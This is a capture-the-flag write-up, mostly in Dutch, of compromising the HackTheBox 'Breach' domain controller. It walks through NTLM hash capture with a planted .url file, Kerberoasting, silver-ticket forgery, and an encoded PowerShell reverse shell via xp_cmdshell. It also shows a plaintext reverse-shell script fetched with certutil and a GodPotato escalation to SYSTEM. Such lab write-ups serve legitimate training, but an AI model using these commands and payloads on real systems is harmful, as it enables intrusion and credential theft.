#### Machine Information

The User flag for this Box is located in a non-standard directory, C:\share\transfer.
# Initial Enumeration
## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Breach]
└─$ nmap 10.129.30.109
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-02 20:24 CET
Nmap scan report for 10.129.30.109
Host is up (0.018s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~/HTB/Breach]
└─$ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985 -sCV 10.129.30.109
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-02 20:25 CET
Nmap scan report for 10.129.30.109
Host is up (0.017s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-02 19:26:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-02T19:26:05+00:00
|_ssl-date: 2026-01-02T19:26:44+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Not valid before: 2025-09-07T08:04:48
|_Not valid after:  2026-03-09T08:04:48
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-02T19:26:09
|_  start_date: N/A

```

Je kan zien dat de smb poort is open. Aangezien we nog geen username en password gevonden hebben zal ik een scan op de smb server proberen doen door gebruik te maken van de anonymous user. Dit zal ik gaan doen door het onderstaande commando te gebruiken. Met het onderstaande commando gaan we zien of er een connectie met de anonymous user kan gemaakt worden en als er shared drives beschikbaar zijn en welke rechten ik hierop zal hebben.

```
┌──(kali㉿kali)-[~/HTB/Breach]
└─$ smbmap -H 10.129.38.136 -u anonymous 
[/] Enumerating shares...                                                  
[+] IP: 10.129.38.136:445       Name: breach.vl                 Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        share                                                   READ, WRITE
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   READ ONLY
[-] Closing connections..                                                          
```

Zoals je hierboven kan zien heeft de anonymous user lees en schrijf rechten op de share drive. Ik zal dus nu een connectie met de shared drive gaan maken door het volgende commando te gaan gebruiken.

```
┌──(kali㉿kali)-[~/HTB/Breach]
└─$ smbclient \\\\10.129.38.136\\share -U anonymous
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \> 
```

## URL File Attack & Golden Ticket Attack

Ik ben dus gaan opzoeken want binnen de transfer dir hebben we een aantal usernames gevonden. Ik ben gaan zoeken naar een ntlm theft methode waarmee we een .url file zullen gaan uploaden binnen de transfer folder en door een responder optezetten langs mijn kant daardoor de hash van de user te verkrijgen. Ik ben hiervoor de volgende url gebruikt. https://www.geeksforgeeks.org/ethical-hacking/url-file-attack-golden-ticket-attacks/ The URL-file attack typically abuses Windows shortcut/URL files (e.g., .url, .website, or shortcuts referencing UNC paths) so that, when a user opens the file, the OS or application attempts to contact a remote resource. That contact can cause the host to perform network authentication (often NTLM or Kerberos) to an attacker-controlled endpoint, leaking credentials or triggering authentication flows that attackers can abuse (relay, capture, or pivot). 

```
┌──(kali㉿kali)-[~/HTB/Breach]
└─$ cat @test.url 
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\10.10.16.154\%USERNAME%.icon
IconIndex=1

smb: \transfer\> put @test.url 
putting file @test.url as \transfer\@test.url (0.9 kB/s) (average 7.2 kB/s)

┌──(kali㉿kali)-[~/HTB/Breach]
└─$ sudo responder -I tun0    

[SMB] NTLMv2-SSP Client   : 10.129.38.136
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:8aa33d32a44b2dee:BE14D830218DB685D56121B6D399E90C:01010000000000000037BBCEB483DC0140C5BD0792138C34000000000200080053004C004500560001001E00570049004E002D0047004C00520046003400380055004C004D005500460004003400570049004E002D0047004C00520046003400380055004C004D00550046002E0053004C00450056002E004C004F00430041004C000300140053004C00450056002E004C004F00430041004C000500140053004C00450056002E004C004F00430041004C00070008000037BBCEB483DC0106000400020000000800300030000000000000000100000000200000F3606FD1211B4A109903917F3DBFD212588D1367A422F5BA8C2C2E9A6B0452380A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100350034000000000000000000 
```

Ik ben de hash nu volledig gaan paste in een file zodat ik deze kan gaan proberen cracken door gebruik te maken van john.

```
┌──(kali㉿kali)-[~/HTB/Breach]
└─$ echo 'Julia.Wong::BREACH:8aa33d32a44b2dee:BE14D830218DB685D56121B6D399E90C:01010000000000000037BBCEB483DC0140C5BD0792138C34000000000200080053004C004500560001001E00570049004E002D0047004C00520046003400380055004C004D005500460004003400570049004E002D0047004C00520046003400380055004C004D00550046002E0053004C00450056002E004C004F00430041004C000300140053004C00450056002E004C004F00430041004C000500140053004C00450056002E004C004F00430041004C00070008000037BBCEB483DC0106000400020000000800300030000000000000000100000000200000F3606FD1211B4A109903917F3DBFD212588D1367A422F5BA8C2C2E9A6B0452380A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100350034000000000000000000' > hash

┌──(kali㉿kali)-[~/HTB/Breach]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt         
Computer1        (Julia.Wong)     
```

Ik ben deze user credentials gaan gebruiken voor in te loggen op de smb server. Dit kan je doen door het onderstaande commando uittevoeren.

| Username   | Password  |
| ---------- | --------- |
| Julia.Wong | Computer1 |
```
┌──(kali㉿kali)-[~/HTB/Breach]
└─$ smbclient \\\\10.129.38.136\\share -U julia.wong     
Password for [WORKGROUP\julia.wong]:
Try "help" to get a list of possible commands.
smb: \> cd transfer
smb: \transfer\> ls
  .                                   D        0  Mon Jan 12 11:32:54 2026
  ..                                  D        0  Mon Jan 12 11:28:04 2026
  @test.url                           A      102  Mon Jan 12 11:32:54 2026
  claire.pope                         D        0  Thu Feb 17 12:21:35 2022
  diana.pope                          D        0  Thu Feb 17 12:21:19 2022
  julia.wong                          D        0  Thu Apr 17 02:38:12 2025
  ntlm_test-(icon).url                A      110  Mon Jan 12 11:23:06 2026
  ntlm_test-(url).url                 A       58  Mon Jan 12 11:22:37 2026
  ntlm_test.wax                       A       60  Mon Jan 12 11:22:17 2026
  test                                A        6  Mon Jan 12 11:06:54 2026

                7863807 blocks of size 4096. 1515004 blocks available
smb: \transfer\> cd julia.wong
smb: \transfer\julia.wong\> ls
  .                                   D        0  Thu Apr 17 02:38:12 2025
  ..                                  D        0  Mon Jan 12 11:32:54 2026
  user.txt                            A       32  Thu Apr 17 02:38:22 2025

                7863807 blocks of size 4096. 1515004 blocks available
smb: \transfer\julia.wong\> get user.txt
getting file \transfer\julia.wong\user.txt of size 32 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
┌──(kali㉿kali)-[~/HTB/Breach]
└─$ cat user.txt 
55d33e52bc5fa7a687b9f0dcfa103dda   
```

Nu dat ik de user credentials gevonden heb, ben ik de gegevens van de ldap server gaan afhalen door gebruik te maken van het volgende commando.

```
┌──(kali㉿kali)-[~/HTB/Breach]
└─$ nxc ldap 10.129.38.136 -u julia.wong -p Computer1 --bloodhound --collection All --dns-server 10.129.38.136
LDAP        10.129.38.136   389    BREACHDC         [*] Windows Server 2022 Build 20348 (name:BREACHDC) (domain:breach.vl)
LDAP        10.129.38.136   389    BREACHDC         [+] breach.vl\julia.wong:Computer1 
LDAP        10.129.38.136   389    BREACHDC         Resolved collection methods: psremote, objectprops, localadmin, rdp, dcom, container, group, session, acl, trusts                                                                   
LDAP        10.129.38.136   389    BREACHDC         Done in 00M 36S
LDAP        10.129.38.136   389    BREACHDC         Compressing output into /home/kali/.nxc/logs/BREACHDC_10.129.38.136_2026-01-12_123838_bloodhound.zip  
```

Ik ben eerst gaan kijken of dat ik niet van mijn owned objects niet naar een Tier Zero kon gaan, maar dit was dus niet het geval. Ik ben dus gaan zoeken welke andere useraccounts buiten KRBTGT@breach.vl kerberoastable zijn. En hier heb ik de volgende user gevonden MSSQLSvc/breachdc.breach.vl.

Ik ben dus nu aan de hand van de targetedkerberoast.py applicatie de ntlm hash gaan retrieve van de server. Dit door gebruik te maken van de usercredentials die we al hadden, domain en de domaincontroller informatie. Doordat we wisten dat er een kerberoastable user was ben ik dit dus gaan uitvoeren. https://github.com/ShutdownRepo/targetedKerberoast

```
┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
└─$ python3 targetedKerberoast.py -u julia.wong -p Computer1 -d breach.vl --dc-ip breachdc.breach.vl 
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (svc_mssql)
$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$6a8e6582b421ae8bf15801dc43235417$3c0140523b85b0f6cb97ef159616a1c38d8c22ff1d5678bb8ef8951f1f6a7c9c7710ce63d43e531a3387b38e0b6aa1e48b3aaa912c11da727ba7265836b4c93fe78dd784206b60a59da33546b863fc0943421b9279c908b5d2446f8b230f61fc5d9b7f3f7cf62504e76255bf85c1a8cd607e058e08e3ba17536e3c251d8cdad717ba350da4702148868ba8f88ceedb1bc1510a6372e069e750a952c6d429de7c1c31c8f3ac892c8eb7c993f98fdcbaf5b463ec4ba994efcccb4727d374ab5ddd26df00157e72d2003a8049b075bc18fde75a7b2f2246a53e2988d7961a84f6c3b035773ee2b665a647c0faa85c7fcd0b94d31961178359af55bf9b1e129976f8545efe7c6ca7c3ae79b5af028aead3993dbb628333d841f8584a3ae3f2bf7da4f2d953ad5483dec38b495d15f230e3ebd595d56ada307b8d04d36649c8f75064b50971c381a5a8124b252bd7123d42aa713d133c1be4230adb88cd337d580a77e965c2d635079ab5650702fafe48f7655b090f9dec69482f07a0a3a680d1f5cdcf21e8a482c10949018b451afe24fe4ea2e21fc8c8f12703e5029aba741c515d8dbea5ab649729878346188978c45300d61f0488ed88e6cc2b1f65b375a72f39e2c570b141f6d491a857e795910672032d751c4d9fcdaef4efb5d718224f94bcbf470b8675f63c4a9108e0d0c19664160797102fd68281da7dda5b0eef88d8d21fbfd41b882eca368680f86a183e385ab0a17320bb5b8b5d34cce970a082ab5e931d9f808a7e7f455d5eddf97d00eabf58f8aac0f98bf8c684b4c6f4ab371fabd141768931dc5735f64a030a7076a1ffe3f1cd5ea76082b0f57cd7007dcaecafc7bfd5425beea14324eedbef1f6f66a5e93242c64d5a0742db43f1eb2dc73c35f889ea2aa41ed3fa680f5507b4fff6d7f41617e6186a971a4bff40b24c848337fe28e87cdd8f1def3610b091bc6ef7a5ba5579d1b47a408ba697e84ac105a73f3dd353f8aadb6ebafa50ed99fd5aa70a01c60df882997aee704c1ab7f30bc59b6b6141d3e51cb0b88d45055771a560fc5992449393666265deb76ccd74b70d2330830c63b893bb2b466cde9dfcbdb78050e3731d72b995efdcf8e0bc5fdc80b537a40553cfbd4e9387871ce71e1c7710ab31fc0e40df591e9a37d7c6958b042ca7574c8b61238373bab0df545859c34cb07048c720274bcb5b811089cbc2cf23dc5a85b24f05a57f6c9785aa6fc2139747ea71c94ea7b819057d15b3ece2814ab39e9f54189bb9e01245d78ad240ffa3b5efe8999afcdda34841d532f4c2db1bd9ca2829f96dcc170cb5c569604942d5a349a9d141629cbb797cb070a8132d21fe3bdd4488ba1452597baf830a9674e9cca8d99f0d5e53e3e68445bff8e5a16fee5f71d621ea92b651e6c80336cb6a1bb53a0128a5695701d93fc0cbc14a4cdee7186ba1d9aeff37012f122dfe68928fe4d257c5
```

Zoals je kan zien heb ik de NTLM hash van de user ontvangen. Kzal deze hash nu in een file gaan zetten en deze gaan cracken door gebruik te maken van john. Zoals je hieronder zult kunnen zien heb ik het password van de svc_mssql gevonden.

| Username  | Password |
| --------- | -------- |
| svc_mssql | Trustno1 |


```
┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
└─$ echo '$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$6a8e6582b421ae8bf15801dc43235417$3c0140523b85b0f6cb97ef159616a1c38d8c22ff1d5678bb8ef8951f1f6a7c9c7710ce63d43e531a3387b38e0b6aa1e48b3aaa912c11da727ba7265836b4c93fe78dd784206b60a59da33546b863fc0943421b9279c908b5d2446f8b230f61fc5d9b7f3f7cf62504e76255bf85c1a8cd607e058e08e3ba17536e3c251d8cdad717ba350da4702148868ba8f88ceedb1bc1510a6372e069e750a952c6d429de7c1c31c8f3ac892c8eb7c993f98fdcbaf5b463ec4ba994efcccb4727d374ab5ddd26df00157e72d2003a8049b075bc18fde75a7b2f2246a53e2988d7961a84f6c3b035773ee2b665a647c0faa85c7fcd0b94d31961178359af55bf9b1e129976f8545efe7c6ca7c3ae79b5af028aead3993dbb628333d841f8584a3ae3f2bf7da4f2d953ad5483dec38b495d15f230e3ebd595d56ada307b8d04d36649c8f75064b50971c381a5a8124b252bd7123d42aa713d133c1be4230adb88cd337d580a77e965c2d635079ab5650702fafe48f7655b090f9dec69482f07a0a3a680d1f5cdcf21e8a482c10949018b451afe24fe4ea2e21fc8c8f12703e5029aba741c515d8dbea5ab649729878346188978c45300d61f0488ed88e6cc2b1f65b375a72f39e2c570b141f6d491a857e795910672032d751c4d9fcdaef4efb5d718224f94bcbf470b8675f63c4a9108e0d0c19664160797102fd68281da7dda5b0eef88d8d21fbfd41b882eca368680f86a183e385ab0a17320bb5b8b5d34cce970a082ab5e931d9f808a7e7f455d5eddf97d00eabf58f8aac0f98bf8c684b4c6f4ab371fabd141768931dc5735f64a030a7076a1ffe3f1cd5ea76082b0f57cd7007dcaecafc7bfd5425beea14324eedbef1f6f66a5e93242c64d5a0742db43f1eb2dc73c35f889ea2aa41ed3fa680f5507b4fff6d7f41617e6186a971a4bff40b24c848337fe28e87cdd8f1def3610b091bc6ef7a5ba5579d1b47a408ba697e84ac105a73f3dd353f8aadb6ebafa50ed99fd5aa70a01c60df882997aee704c1ab7f30bc59b6b6141d3e51cb0b88d45055771a560fc5992449393666265deb76ccd74b70d2330830c63b893bb2b466cde9dfcbdb78050e3731d72b995efdcf8e0bc5fdc80b537a40553cfbd4e9387871ce71e1c7710ab31fc0e40df591e9a37d7c6958b042ca7574c8b61238373bab0df545859c34cb07048c720274bcb5b811089cbc2cf23dc5a85b24f05a57f6c9785aa6fc2139747ea71c94ea7b819057d15b3ece2814ab39e9f54189bb9e01245d78ad240ffa3b5efe8999afcdda34841d532f4c2db1bd9ca2829f96dcc170cb5c569604942d5a349a9d141629cbb797cb070a8132d21fe3bdd4488ba1452597baf830a9674e9cca8d99f0d5e53e3e68445bff8e5a16fee5f71d621ea92b651e6c80336cb6a1bb53a0128a5695701d93fc0cbc14a4cdee7186ba1d9aeff37012f122dfe68928fe4d257c5' > hash

┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt         
Trustno1         (?)     
Session completed. 
```

Nu dat we svc_mssql password hebben, zal ik gaan inloggen op de mssqlclient met de user credentials van de gebruiker svc_mssql.

```
┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
└─$ mssqlclient.py BREACH/svc_mssql@10.129.38.136 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (BREACH\svc_mssql  guest@master)> 
```

Zoals je zelf zult kunnen zien kan ik geen impersonate van de gebruiker doen doordat er geen gekent is. Ik ben dus eerst nu gaan zoeken op sid.

```
┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
└─$ lookupsid.py breach.vl/svc_mssql:Trustno1@breachdc.breach.vl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at breachdc.breach.vl
[*] StringBinding ncacn_np:breachdc.breach.vl[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2330692793-3312915120-706255856
```

We calculate the secret identifier (NT hash) for Kerberos signing:

```
┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
└─$ iconv -f ASCII -t UTF-16LE <(printf 'Trustno1') | openssl dgst -md4
MD4(stdin)= 69596c7aa1e8daee17f8e78870e25a5c
```

Nu zal ik een Zilver ticket gaan aanmaken waar ik zal gaan targetten op de MSSQL service.

```
┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
└─$ impacket-ticketer -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856  -domain breach.vl -spn MSSQLSvc/breachdc.breach.vl:1433 Christine.Bruce
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for breach.vl/Christine.Bruce
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Christine.Bruce.ccache
```

Nu zal ik gaan inloggen met de zonet aangemaakte zilver ticket door het volgende commando te gebruiken.

```
┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
└─$ mssqlclient.py -k -no-pass breachdc.breach.vl                      

SQL (BREACH\Administrator  dbo@master)>
```

Via Online revshell tool een revshell gemaakt. Deze met het xp_cmdshell commando uitgevoerd en daardoor een connectie met de windows machine als svc_mssql gekregen.

```
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA1ADQAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

┌──(kali㉿kali)-[~/HTB/Breach]
└─$ nc -lvnp 4444                                                                                             
Listening on 0.0.0.0 4444
Connection received on 10.129.38.136 54383

PS C:\Windows\system32>
```

Ik ben gaan kijken welke privileges ik allemaal heb met deze user, en hierbij zal ke kunnen zien dat je impersonate rechten hebt. Deze zal ik gaan misbruiken voor priv escalation te doen.

```
PS C:\Users\svc_mssql> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

## Priv Escalation by SeImpersonatePrivilege

Hiervoor ben ik gebruik gaan maken van de volgende tools: Certutil voor het uploaden van de bestanden van mijn eigen machine naar de windows connectie, GodPotato-NET4.exe Met deze tool zal ik de connectie die ik gemaakt heb in mijn powershell bestand gaan maken als administrator.

https://github.com/BeichenDream/GodPotato/releases

Kzal dus als eerst de tool gaan downloaden op mijn kali machine en deze daarna overzetten naar mijn windows machine. Dit ben ik gaan doen door gebruik te maken van de certutil tool.

```
PS C:\temp> certutil -urlcache -split -f http://10.10.16.154:8000/GodPotato-NET4.exe 
****  Online  ****
  0000  ...
  e000
CertUtil: -URLCache command completed successfully.

```
Nu dat ik de tool heb gedownload, heb ik een powershell file vanuit een vorige box genomen waarmee ik de connectie zal kunnen maken met de admin. Ik zal alleen het password zelf moeten aanpassen en dan kan ik deze ook uploaden naar de server.

```
┌──(kali㉿kali)-[~/HTB/Breach]
└─$ cat rce.ps1  
$c = New-Object System.Net.Sockets.TCPClient('10.10.16.154',4444);$s = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $s.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sb = (iex ". { $data } 2>&1" | Out-String ); $sb2 = $sb + '#';$seb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($seb,0,$seb.Length);$s.Flush()};$c.Close()

PS C:\temp> certutil -urlcache -split -f http://10.10.16.154:8000/rce.ps1
****  Online  ****
  0000  ...
  019f
CertUtil: -URLCache command completed successfully.
```

Nu dat de beide bestanden zijn upgeload, zal ik aan de hand van de GodPotato een priv escalation gaan doen. Dit ben ik gaan doen door het onderstaande commando te gebruiken en door een listener optestarten op mijn eigen machine.

```
PS C:\temp> .\GodPotato-NET4.exe -cmd "powershell -file C:\Users\svc_mssql\rce.ps1"
```

Zoals je hieronder kunt zien heb ik de connectie als administrator rechten kunnen verkrijgen op mijn listener terminal.

```
┌──(kali㉿kali)-[~/HTB/Breach]
└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.38.136 55229

#
#whoami
nt authority\system
```

Hierdoor heb ik de volgende root flag kunnen vinden.

```
#cat root.txt
fc98f418f94f8cdb9a30ef026fe64345
```

![[Pasted image 20260112162021.png]]